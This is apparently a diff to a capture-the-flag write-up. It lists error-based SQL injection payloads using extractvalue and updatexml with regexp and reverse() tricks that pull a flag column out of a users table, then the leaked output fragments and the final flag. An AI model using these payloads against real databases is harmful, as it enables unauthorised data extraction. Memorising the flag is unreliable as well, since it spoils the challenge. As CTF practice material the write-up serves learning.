@@ -1234,3 +1234,15 @@ Request	Payload	Status code	Response received	Error	Timeout	Length	Comment
 			
 			1"||extractvalue(1,concat(0x7e,(select(real_flag_1s_here)from(users)where(real_flag_1s_here)regexp('^f'))))#
 			1"||extractvalue(1,concat(0x7e,reverse((select(real_flag_1s_here)from(users)where(real_flag_1s_here)regexp('^f')))))#
+			-1"&&updatexml(1,concat(0x7e,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp('.*{.*'))),0x7e),1)#
+			returns:CTF2{6d51a38c-b595-40ee-9926-c2
+			-1"&&updatexml(1,concat(0x7e,reverse((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp('.*{.*'))),0x7e),1)#
+			returns:~}3d73c273ef2c-6299-ee04-595b-c8
+			
+			```python
+				sub_str="}3d73c273ef2c-6299-ee04-595b-c8"
+				print(sub_str[::-1])
+			```
+				8c-b595-40ee-9926-c2fe372c37d3}
+					
+			finally flag:CTF2{6d51a38c-b595-40ee-9926-c2fe372c37d3}
